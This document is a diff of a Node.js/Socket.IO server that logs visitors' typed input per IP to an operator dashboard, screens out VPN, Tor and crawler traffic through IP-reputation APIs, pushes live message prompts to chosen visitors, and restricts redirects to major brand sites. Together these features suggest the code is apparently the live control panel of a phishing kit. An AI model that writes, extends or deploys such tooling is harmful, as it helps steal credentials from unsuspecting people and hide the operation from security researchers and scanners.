+      socket.emit('unblock-ip-result', { 
+        success, 
+        ip,
+        message: success ? `IP ${ip} has been unblocked` : `IP ${ip} was not blocked` 
+      });
+    });
+    
+/**
+ * Check if an IP address is a proxy/VPN
+ * @param {string} ip - The IP address to check
+ * @returns {Promise<boolean>} - A promise that resolves to true if the IP is a proxy, false otherwise
+ */
+async function isProxyIP(ip) {
+  // Skip check for local/private IPs
+  if (isLocalIP(ip)) {
+    console.log(`IP ${ip} is local/private, skipping proxy check`);
+    return false;
+  }
+  
+  // Check cache first
+  const cacheKey = `proxy_${ip}`;
+  const cachedResult = ipCache.get(cacheKey);
+  if (cachedResult !== undefined) {
+    console.log(`Using cached proxy result for IP ${ip}: ${cachedResult}`);
+    return cachedResult;
+  }
+  
+  try {
+    // Try ipqualityscore.com API if API key is available
+    if (process.env.IPQS_API_KEY) {
+      const url = `https://ipqualityscore.com/api/json/ip/${process.env.IPQS_API_KEY}/${ip}?strictness=1&allow_public_access_points=true`;
+      const response = await axios.get(url);
+      
+      if (response.data && response.data.success) {
+        const isProxy = response.data.proxy || response.data.vpn || response.data.tor || response.data.is_crawler;
+        console.log(`IP ${ip} proxy check result from ipqualityscore.com:`, isProxy);
+        
+        // Cache the result for 12 hours
+        ipCache.set(cacheKey, isProxy, 12 * 60 * 60);
+        return isProxy;
+      }
+    }
+    
+    // Fallback to ipapi.co which has some proxy detection
+    const url = `https://ipapi.co/${ip}/json/`;
+    const response = await axios.get(url);
+    
+    if (response.data) {
+      // ipapi.co doesn't have a direct proxy field, but we can check for data centers and security threats
+      const isProxy = response.data.security && (response.data.security.is_proxy || response.data.security.is_datacenter || response.data.security.is_threat);
+      console.log(`IP ${ip} proxy check result from ipapi.co:`, isProxy || false);
+      
+      // Cache the result for 12 hours
+      ipCache.set(cacheKey, isProxy || false, 12 * 60 * 60);
+      return isProxy || false;
+    }
+    
+    // Default to false if we couldn't determine
+    console.log(`Could not determine if IP ${ip} is a proxy, defaulting to false`);
+    return false;
+  } catch (err) {
+    console.error(`Error checking if IP ${ip} is a proxy:`, err);
+    return false;
+  }
+}
+
+/**
+ * Get country from IP address using external API
+ * @param {string} ip - The IP address to look up
+ * @returns {Promise<string>} - A promise that resolves to a 2-letter country code
+ */
+async function getCountryFromIP(ip) {
+  try {
+    // Check if IP is valid
+    if (!ip || ip === 'unknown' || ip === 'localhost' || ip === '127.0.0.1') {
+      return 'XX'; // Unknown country code
+    }
+    
+    // Check cache first
+    const cachedCountry = getCountryFromCache(ip);
+    if (cachedCountry) {
+      return cachedCountry;
+    }
+    
+    // Try multiple IP geolocation services for redundancy
+    const services = [
+      `https://ipapi.co/${ip}/country/`,
+      `https://ipinfo.io/${ip}/country`,
+      `https://api.ipgeolocation.io/ipgeo?apiKey=${process.env.IPGEO_API_KEY}&ip=${ip}`
+    ];
+    
+    // Try each service in sequence until one works
+    for (const service of services) {
+      try {
+        const response = await axios.get(service, { timeout: 3000 });
+        let country = null;
+        
+        if (response.data) {
+          if (typeof response.data === 'string') {
+            // ipapi.co and ipinfo.io return just the country code as a string
+            country = response.data.trim();
+          } else if (response.data.country_code2) {
+            // ipgeolocation.io returns a JSON object
+            country = response.data.country_code2;
+          }
+          
+          if (country && country.length === 2) {
+            // Cache the result
+            cacheCountry(ip, country);
+            return country.toUpperCase();
+          }
+        }
+      } catch (err) {
+        console.log(`Error with ${service}:`, err.message);
+        // Continue to next service
+      }
+    }
+    
+    // If all services fail, return unknown
+    return 'XX';
+  } catch (err) {
+    console.error('Error in getCountryFromIP:', err);
+    return 'XX';
+  }
+}
+
+// Country cache to reduce API calls
+const countryCache = new Map();
+const CACHE_TTL = 24 * 60 * 60 * 1000; // 24 hours
+
+/**
+ * Get country from cache
+ * @param {string} ip - The IP address to look up
+ * @returns {string|null} - The country code or null if not in cache
+ */
+function getCountryFromCache(ip) {
+  if (countryCache.has(ip)) {
+    const cacheEntry = countryCache.get(ip);
+    if (Date.now() - cacheEntry.timestamp < CACHE_TTL) {
+      return cacheEntry.country;
+    } else {
+      // Remove expired entry
+      countryCache.delete(ip);
+    }
+  }
+  return null;
+}
+
+/**
+ * Cache country for an IP
+ * @param {string} ip - The IP address
+ * @param {string} country - The country code
+ */
+function cacheCountry(ip, country) {
+  countryCache.set(ip, {
+    country: country.toUpperCase(),
+    timestamp: Date.now()
+  });
+}
     
     // Handle client IP updates
     socket.on('client-ip', (data) => {
@@ -2082,11 +4253,24 @@ http.listen(PORT, () => {
 
     // Handle input data from clients
     socket.on('input-data', (data) => {
-      const clientIP = getClientIP(data, socket);
+      // Get the most accurate client IP available
+      const clientIP = data.clientIP || data.ip || getClientIP(data, socket);
+      
+      console.log(`Received input data from client IP: ${clientIP} on path: ${data.path || 'unknown'}`);
 
       // Skip if IP is blocked
       if (isIPBlocked(clientIP)) {
+        console.log(`Skipping input tracking for blocked IP: ${clientIP}`);
         return;
+      }
+
+      // Store the accurate IP mapping if available
+      if (data.clientIP && data.clientIP !== data.ip) {
+        accurateClientIPs.set(data.ip, {
+          clientIP: data.clientIP,
+          timestamp: new Date().toISOString()
+        });
+        console.log(`Updated accurate IP mapping: ${data.ip} -> ${data.clientIP}`);
       }
 
       // Update input data cache with the new data
@@ -2095,5 +4279,167 @@ http.listen(PORT, () => {
       // Emit dashboard update
       io.emit('dashboard-update');
     });
+  });
+
+// This function was moved to the top of the file to avoid duplicate declarations
+// See the implementation at line ~747
+
+/**
+ * Emit a message prompt event to a specific IP address
+ * @param {string} ip - The IP address to send the message to
+ * @param {string} message - The message content
+ * @param {string} type - The message type (info, warning, error, success)
+ * @param {string} title - The message title
+ * @returns {boolean} - Whether the message was sent successfully
+ */
+function emitMessagePrompt(ip, message, type = 'info', title = 'Message') {
+  // Validate inputs
+  if (!ip || !message) {
+    console.error('Invalid message prompt parameters:', { ip, message });
+    return false;
+  }
+  
+  // Find all active sockets for this IP
+  const activeSockets = findSocketsByIP(ip);
+  if (!activeSockets || activeSockets.length === 0) {
+    console.log(`No active sockets found for IP ${ip}`);
+    return false;
+  }
+  
+  // Send message prompt event to all active sockets for this IP
+  let messageSent = false;
+  activeSockets.forEach(socketId => {
+    const socket = io.sockets.sockets.get(socketId);
+    if (socket && socket.connected) {
+      console.log(`Emitting message prompt to socket ${socketId} for IP ${ip}: ${message}`);
+      socket.emit('message-prompt', { ip, message, type, title });
+      messageSent = true;
+    }
+  });
+  
+  return messageSent;
+}
+
+/**
+ * Find all active socket IDs for a specific IP address
+ * @param {string} ip - The IP address to find sockets for
+ * @returns {Array} - Array of socket IDs
+ */
+function findSocketsByIP(ip) {
+  // Check if we have a mapping for this IP in activeSocketsByIP
+  if (activeSocketsByIP.has(ip)) {
+    return activeSocketsByIP.get(ip);
+  }
+  
+  // If not found in the map, try to find sockets with this IP
+  const matchingSockets = [];
+  io.sockets.sockets.forEach((socket, id) => {
+    if (socket.clientIP === ip) {
+      matchingSockets.push(id);
+    }
+  });
+  
+  // Cache the result for future use
+  if (matchingSockets.length > 0) {
+    activeSocketsByIP.set(ip, matchingSockets);
+  }
+  
+  return matchingSockets;
+}
+
+/**
+ * Sanitize and validate a URL
+ * @param {string} url - The URL to sanitize
+ * @returns {string|null} - The sanitized URL or null if invalid
+ */
+function sanitizeURL(url) {
+  if (!url) return null;
+  
+  // If URL doesn't start with http/https and doesn't start with a slash, assume it's a relative path
+  if (!url.startsWith('http://') && !url.startsWith('https://') && !url.startsWith('/')) {
+    url = '/' + url;
+  }
+  
+  // For security, if it's an absolute URL, only allow certain domains
+  if (url.startsWith('http://') || url.startsWith('https://')) {
+    try {
+      const urlObj = new URL(url);
+      const allowedDomains = [
+        'google.com',
+        'microsoft.com',
+        'apple.com',
+        'amazon.com',
+        'facebook.com',
+        'twitter.com',
+        'instagram.com',
+        'linkedin.com',
+        'youtube.com',
+        'netflix.com',
+        'spotify.com',
+        'localhost'
+      ];
+      
+      // Check if domain or its parent is in allowed list
+      const domain = urlObj.hostname;
+      const isAllowed = allowedDomains.some(allowedDomain => 
+        domain === allowedDomain || domain.endsWith('.' + allowedDomain)
+      );
+      
+      if (!isAllowed) {
+        console.warn(`Blocked redirect to non-allowed domain: ${domain}`);
+        return null;
+      }
+    } catch (e) {
+      console.error('Invalid URL:', url, e);
+      return null;
+    }
+  }
+  
+  return url;
+}
+
+// API endpoint to get input data for a specific IP
+app.get('/dashboard/input-data/:ip', (req, res) => {
+  const ip = req.params.ip;
+  
+  // Validate IP
+  if (!ip) {
+    return res.status(400).json({ error: 'Invalid IP address' });
+  }
+  
+  // Get visitor data for this IP
+  const visitorData = {};
+  if (ipCache.has(ip)) {
+    Object.assign(visitorData, ipCache.get(ip));
+  }
+  
+  // Get actual input data for this IP from our inputDataByIP map
+  const inputData = inputDataByIP.has(ip) ? inputDataByIP.get(ip) : [];
+  
+  // Sort input data by timestamp (newest first)
+  inputData.sort((a, b) => {
+    const dateA = new Date(a.timestamp);
+    const dateB = new Date(b.timestamp);
+    return dateB - dateA;
+  });
+  
+  // Return input data and visitor metadata
+  res.json({
+    inputs: inputData,
+    meta: {
+      browser: visitorData.browser || 'Unknown',
+      os: visitorData.os || 'Unknown',
+      device: visitorData.device || visitorData.deviceType || 'Unknown',
+      firstSeen: visitorData.firstRequest || new Date().toISOString(),
+      lastActivity: visitorData.lastActivity || visitorData.lastRequest || new Date().toISOString(),
+      currentPath: visitorData.lastPath || '/',
+      country: visitorData.country || 'Unknown',
+      city: visitorData.city || 'Unknown',
+      isp: visitorData.isp || 'Unknown',
+      org: visitorData.org || 'Unknown',
+      proxy: visitorData.proxy || false,
+      timezone: visitorData.timezone || 'Unknown',
+      referrer: visitorData.referrer || 'Direct'
+    }
   });
 });
